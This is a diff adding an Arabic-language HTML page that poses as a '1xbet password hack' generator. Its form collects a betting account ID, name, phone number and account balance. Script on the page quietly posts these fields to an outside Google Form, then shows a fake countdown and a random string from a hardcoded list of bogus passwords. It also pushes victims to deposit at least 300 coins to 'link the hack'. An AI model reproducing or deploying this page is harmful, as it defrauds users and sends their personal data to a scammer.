@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1 X-password</title>
+    <link rel="icon" href="favicon.png" type="image/png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: url('77.jpg') no-repeat center center fixed;
+            background-image: url('77.jpg');
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            background-color: #2600ffea;
+            margin: 0;
+            padding: 0;
+        }
+        
+
+
+        @media (max-width: 768px) {
+    body {
+        background-image: url('background-tablet.jpg');
+    }
+}
+
+/* صورة الخلفية للهواتف الذكية */
+@media (max-width: 480px) {
+    body {
+        background-image: url('background-mobile.jpg');
+    }
+}
+
+
+
+
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #ffffffb9;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        form label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #333;
+        }
+
+        form input {
+            width: 60%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .button {
+            padding: 10px 20px;
+            background-color: #1900ff;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 60%;
+            margin-bottom: 10px;
+        }
+
+        .button:disabled {
+            background-color: #ff0000;
+        }
+
+        .button:hover {
+            background-color: #0056b3;
+        }
+
+        #warning-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+            width: 300px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 6px solid #007BFF;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #password-display {
+            font-size: 20px;
+            color: #28a745;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .copy-button {
+            padding: 10px 20px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: red;
+        }
+
+        .dawen-button {
+            padding: 10px 20px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: rgb(24, 102, 0);
+        }
+
+        .copy-button.copied {
+            background-color: orange;
+            cursor: default;
+        }
+        
+
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #ffffffb9;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        form label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #333;
+        }
+
+        form input {
+    width: 60%; /* اجعل العرض 100% لتملأ الحاوية */
+    padding: 10px;
+    margin: 10px 0;
+    border: 2px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+}
+
+
+
+
+        form {
+    width: 300px; /* عرض المربع المحيط بالحقول */
+    padding: 20px; /* المسافة الداخلية داخل المربع */
+    border-radius: 10px; /* حواف دائرية للمربع */
+    border: 1px solid #ccc; /* الحدود المحيطة بالمربع */
+    margin: 10px auto; /* لضبط المسافة من الأعلى والأسفل */
+    box-sizing: border-box; /* لضمان أن الحشو والحدود تكون داخل الحجم الإجمالي */
+}
+
+form input, form button {
+    width: 85%; /* لجعل الحقول والأزرار تأخذ العرض الكامل داخل المربع */
+    padding: 12px; /* تغيير حجم الحشو لزيادة المساحة الداخلية */
+    font-size: 20px; /* تغيير حجم الخط داخل المربعات */
+    margin: 10px 0; /* المسافة بين العناصر */
+    border: 2px solid #777777; /* الحدود حول الحقول والأزرار */
+    border-radius: 5px; /* حواف دائرية للعناصر */
+    box-sizing: border-box; /* لضمان أن الحشو والحدود تعتبر جزء من الحجم */
+}
+
+form button {
+    background-color: #4CAF50; /* لون الخلفية لزر التسجيل */
+    color: white; /* اللون النص داخل الزر */
+    cursor: pointer; /* تغيير شكل المؤشر عند المرور فوق الزر */
+}
+
+form button:hover {
+    background-color: #45a049; /* تغيير اللون عند المرور فوق الزر */
+}
+
+
+
+        .button {
+            padding: 10px 20px;
+            background-color: #1900ff;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 60%;
+            margin-bottom: 10px;
+        }
+
+        .button:disabled {
+            background-color: #2f00ff;
+        }
+
+        .button:hover {
+            background-color: #0056b3;
+        }
+
+        #warning-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+            width: 300px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 6px solid #007BFF;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #password-display {
+            font-size: 20px;
+            color: #28a745;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .copy-button {
+            padding: 10px 20px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: red;
+        }
+
+        .dawen-button {
+            padding: 10px 20px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: rgb(24, 102, 0);
+        }
+
+        .copy-button.copied {
+            background-color: orange;
+            cursor: default;
+        }
+
+        .game-selection {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+        }
+
+        .game-selection img {
+            width: 80px;
+            height: 80px;
+            opacity: 0.6;
+            cursor: pointer;
+        }
+
+        .game-selection img.selected {
+            opacity: 1;
+        }
+
+        .game-selection img.checked {
+            border: 2px solid green;
+        }
+
+        .game-selection .selected,
+        .game-selection .checked {
+            opacity: 1;
+        }
+
+        .game-selection .game-option {
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        .game-selection .game-option:hover {
+            opacity: 0.8;
+        }
+
+
+        #warning-box {
+        animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+        to {
+            opacity: 1;
+        }
+    }
+
+    #warning-box img {
+        animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+        0%, 100% {
+            transform: scale(1);
+        }
+        50% {
+            transform: scale(1.1);
+        }
+    }
+
+    
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form id="register-form">
+            <div>
+                <input type="text" id="account-id" name="account-id" placeholder="id الحساب" pattern="[0-9]+" maxlength="20" required>
+                <p id="error-account-id" class="error-message" style="display:none; color:red; font-size:12px;">الرجاء إدخال رقم صحيح مكون من أرقام فقط .</p>
+            </div>
+            <div>
+                <input type="text" id="name" name="name" placeholder="اسمك" required>
+                <p id="error-name" class="error-message" style="display:none; color:red; font-size:12px;">الرجاء إدخال الاسم.</p>
+            </div>
+            <div>
+                <input type="text" id="phone" name="phone" placeholder="رقم الهاتف" pattern="[0-9]{11}" maxlength="11" required>
+                <p id="error-phone" class="error-message" style="display:none; color:red; font-size:12px;">الرجاء إدخال رقم هاتف صحيح مكون من 11 رقمًا.</p>
+            </div>
+            <div>
+                <input type="text" id="mony" name="mony" placeholder="الاموال الموجودة بالحساب" pattern="[0-9]+" required>
+                <p id="error-mony" class="error-message" style="display:none; color:red; font-size:12px;">الرجاء إدخال قيمة مالية صحيحة.</p>
+            </div>
+            <button type="submit" class="button" id="submit-btn" disabled>تسجيل</button>
+        </form>
+    </div>
+    
+
+    <div id="warning-box" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgb(241, 241, 241); border: 2px dashed rgb(16, 3, 209); border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); text-align: center; padding: 20px; z-index: 1000; width: 300px;">
+        <div style="position: absolute; top: 10px; left: 10px; cursor: pointer;" id="close-warning">❌</div>
+        <div>
+            <img src="https://via.placeholder.com/50x50/FF0000/FFFFFF?text=!" alt="Warning" style="margin-bottom: 10px;">
+            <p style="color: red; font-size: 16px; font-weight: bold;">الرجاء إيداع مبلغ أكبر لا يقل عن 300 عملة في الحساب لربط الهاك بحسابك</p>
+        </div>
+    </div>
+    
+
+
+
+
+    <!-- Overlay -->
+    <div class="overlay" id="overlay">
+        <div class="modal">
+            <div id="loading-section">
+                <div class="loader"></div>
+                <p>جاري توليد كلمة مرور ...</p>
+                <p id="countdown">60</p>
+            </div>
+            <div id="success-section" style="display: none;">
+                <p style="color: green; font-size: 18px;">✔ تم توليد كلمة المرور</p>
+            </div>
+            <div id="password-section" style="display: none;">
+                <p id="password-display"></p>
+                <button id="copy-button" class="copy-button">اضغط لنسخ كلمة المرور</button>
+                <button id="dawen-button" class="dawen-button">تحميل التطبيق</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const passwords = [
+            "1-xbetA1B2C3", "1-xbetD4E5F6", "1-xbetG7H8I9", "1-xbetJ0K1L2", "1-xbetM3N4O5", 
+            "1-xbetP6Q7R8", "1-xbetS9T0U1", "1-xbetV2W3X4", "1-xbetY5Z6A7", "1-xbetB8C9D0", 
+            "1-xbetE1F2G3", "1-xbetH4I5J6", "1-xbetK7L8M9", "1-xbetN0O1P2", "1-xbetQ3R4S5", 
+            "1-xbetT6U7V8", "1-xbetW9X0Y1", "1-xbetZ2A3B4", "1-xbetC5D6E7", "1-xbetF8G9H0", 
+            "1-xbetI1J2K3", "1-xbetL4M5N6", "1-xbetO7P8Q9", "1-xbetR0S1T2", "1-xbetU3V4W5", 
+            "1-xbetX6Y7Z8", "1-xbetA9B0C1", "1-xbetD2E3F4", "1-xbetG5H6I7", "1-xbetJ8K9L0", 
+            "1-xbetM1N2O3", "1-xbetP4Q5R6", "1-xbetS7T8U9", "1-xbetV0W1X2", "1-xbetY3Z4A5", 
+            "1-xbetB6C7D8", "1-xbetE9F0G1", "1-xbetH2I3J4", "1-xbetK5L6M7"
+        ];
+
+        const form = document.getElementById("register-form");
+        const overlay = document.getElementById("overlay");
+        const countdownElement = document.getElementById("countdown");
+        const loadingSection = document.getElementById("loading-section");
+        const successSection = document.getElementById("success-section");
+        const passwordSection = document.getElementById("password-section");
+        const passwordDisplay = document.getElementById("password-display");
+        const copyButton = document.getElementById("copy-button");
+        const submitButton = document.getElementById("submit-btn");
+        const warningMessage = document.getElementById("warning-message");
+        
+        const backgrounds = ['bg1.jpg', 'bg2.jpg', 'bg3.jpg', 'bg4.jpg', 'bg5.jpg'];
+
+        let currentBackground = 0;
+
+        setInterval(() => {
+            currentBackground = (currentBackground + 1) % backgrounds.length;
+            document.body.style.backgroundImage = `url(${backgrounds[currentBackground]})`;
+        }, 5000);
+
+        form.addEventListener("input", function() {
+            const isValid = form.checkValidity();
+            if (isValid) {
+                submitButton.disabled = false;
+                warningMessage.style.display = "none";
+            } else {
+                submitButton.disabled = true;
+                warningMessage.style.display = "block";
+            }
+        });
+
+        form.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            overlay.style.display = "flex";
+
+            // ارسال البيانات إلى Google Form
+            const googleFormAction = "https://docs.google.com/forms/d/e/1FAIpQLSeFRQejS5JwgT65cz10DUEXPZeRxHfT5JRovJ3E1VM9XDjsQw/formResponse";
+            const formData = new FormData();
+            formData.append("entry.1871245093", document.getElementById("account-id").value);
+            formData.append("entry.792692600", document.getElementById("name").value);
+            formData.append("entry.1279053688", document.getElementById("phone").value);
+            formData.append("entry.1468775241", document.getElementById("mony").value);
+
+            fetch(googleFormAction, {
+                method: "POST",
+                body: formData,
+                mode: "no-cors"
+            }).then(() => {
+                console.log("تم إرسال البيانات إلى Google Form.");
+            }).catch((error) => {
+                console.error("حدث خطأ أثناء إرسال البيانات:", error);
+            });
+
+            let countdown = 60;
+            countdownElement.textContent = countdown;
+            const timer = setInterval(() => {
+                countdown -= 1;
+                countdownElement.textContent = countdown;
+
+                if (countdown === 0) {
+                    clearInterval(timer);
+                    loadingSection.style.display = "none";
+                    successSection.style.display = "block";
+
+                    setTimeout(() => {
+                        successSection.style.display = "none";
+                        passwordSection.style.display = "block";
+
+                        const randomPassword = passwords[Math.floor(Math.random() * passwords.length)];
+                        passwordDisplay.textContent = randomPassword;
+                    }, 1000);
+                }
+            }, 1000);
+        });
+
+        copyButton.addEventListener("click", function() {
+            const password = passwordDisplay.textContent;
+            navigator.clipboard.writeText(password).then(() => {
+                copyButton.textContent = "تم نسخ كلمة المرور";
+                copyButton.classList.add("copied");
+                copyButton.disabled = true;
+            });
+        });
+
+        document.getElementById('dawen-button').addEventListener('click', function() {
+            window.location.href = 'https://google.com';
+        });
+
+        form.addEventListener("input", function () {
+    const accountId = document.getElementById("account-id");
+    const name = document.getElementById("name");
+    const phone = document.getElementById("phone");
+    const mony = document.getElementById("mony");
+
+    const errorAccountId = document.getElementById("error-account-id");
+    const errorName = document.getElementById("error-name");
+    const errorPhone = document.getElementById("error-phone");
+    const errorMony = document.getElementById("error-mony");
+
+    // التحقق من الحقول وتحديد الأخطاء
+    if (accountId.validity.valid) {
+        errorAccountId.style.display = "none";
+    } else {
+        errorAccountId.style.display = "block";
+    }
+
+    if (name.validity.valid) {
+        errorName.style.display = "none";
+    } else {
+        errorName.style.display = "block";
+    }
+
+    if (phone.validity.valid) {
+        errorPhone.style.display = "none";
+    } else {
+        errorPhone.style.display = "block";
+    }
+
+    if (mony.validity.valid) {
+        errorMony.style.display = "none";
+    } else {
+        errorMony.style.display = "block";
+    }
+
+    // تفعيل أو تعطيل زر الإرسال بناءً على صحة النموذج
+    const isValid = form.checkValidity();
+    submitButton.disabled = !isValid;
+});
+
+
+
+const warningBox = document.getElementById("warning-box");
+const closeWarning = document.getElementById("close-warning");
+const monyField = document.getElementById("mony");
+
+// إغلاق المربع التحذيري عند الضغط على زر الإغلاق
+closeWarning.addEventListener("click", function () {
+    warningBox.style.display = "none";
+});
+
+// التحقق من قيمة الأموال عند الإدخال
+monyField.addEventListener("input", function () {
+    const monyValue = parseInt(monyField.value, 10);
+
+    // عرض المربع التحذيري إذا كانت القيمة أقل من 300
+    if (!isNaN(monyValue) && monyValue < 300) {
+        warningBox.style.display = "block";
+    } else {
+        warningBox.style.display = "none";
+    }
+});
+
+
+
+
+    </script>
+</body>
+</html>
